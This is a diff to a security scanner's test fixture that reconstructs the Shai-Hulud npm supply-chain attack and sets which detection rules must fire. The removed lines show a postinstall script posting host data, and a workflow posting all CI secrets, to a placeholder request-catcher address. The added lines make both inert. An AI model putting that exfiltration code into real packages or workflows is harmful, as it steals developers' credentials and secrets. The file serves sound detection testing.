@@ -13,33 +13,34 @@ sources:
   - https://www.recordedfuture.com/blog/massive-malicious-npm-package-attack-threatens-software-supply-chains
   - https://www.cohesity.com/trust/redlab/advisories/supply-chain-compromise-shai-hulud/
 reconstruction: >
-  A package whose postinstall runs bundle.js, which posts host data to a
-  request-catcher address, and the persistence workflow that posts toJSON(secrets)
-  there. The webhook address is a fixed all-zero placeholder, not an indicator.
+  A package whose postinstall runs bundle.js, which names a request-catcher address
+  next to a dummy report, and the persistence workflow whose job holds toJSON(secrets)
+  and the same address. Nothing is collected or sent: bundle.js only exports the
+  address, and the workflow step only echoes to /dev/null. The webhook address is a
+  fixed all-zero placeholder, not an indicator.
 files:
   package.json: |
     {"name": "demo-lib", "version": "1.0.1", "scripts": {"postinstall": "node bundle.js"}}
   bundle.js: |
-    (()=>{var e=require("os"),t=process.env;async function n(){const r=JSON.stringify({host:e.hostname(),env:Object.keys(t)});await fetch("https://webhook.site/00000000-0000-0000-0000-000000000000",{method:"POST",body:r})}n().catch(()=>{})})();
+    // Shape only: the target is named, nothing is collected or sent.
+    const report = { host: "dummy", tokens: [] };
+    const target = "https://webhook.site/00000000-0000-0000-0000-000000000000";
+    module.exports = { report, target };
   .github/workflows/shai-hulud-workflow.yml: |
     on: push
     jobs:
       process:
         runs-on: ubuntu-latest
         steps:
-          - run: curl -d "$CONTENTS" https://webhook.site/00000000-0000-0000-0000-000000000000
+          - run: echo "would send CONTENTS to $ENDPOINT" > /dev/null
             env:
+              ENDPOINT: https://webhook.site/00000000-0000-0000-0000-000000000000
               CONTENTS: ${{ toJSON(secrets) }}
 must_fire:
   - {rule: RC-AUTO-001, path: package.json}
   - {rule: RC-DLX-005, path: bundle.js}
-must_not_fire: [RC-AUTO-060, RC-AUTO-061]
-known_gaps:
-  - rule: RC-DLX-005
-    path: .github/workflows/shai-hulud-workflow.yml
-    reason: >
-      The workflow sends all secrets to a request catcher; RC-DLX-005 only reads code
-      files, not workflow YAML, and no other rule looks at toJSON(secrets).
+  - {rule: RC-DLX-006, path: .github/workflows/shai-hulud-workflow.yml}
+must_not_fire: [RC-AUTO-060, RC-AUTO-061, RC-AUTO-062]
 not_covered: >
   Running TruffleHog, publishing packages with stolen tokens and creating repositories
   happen at run time and are not visible as patterns in a repository.
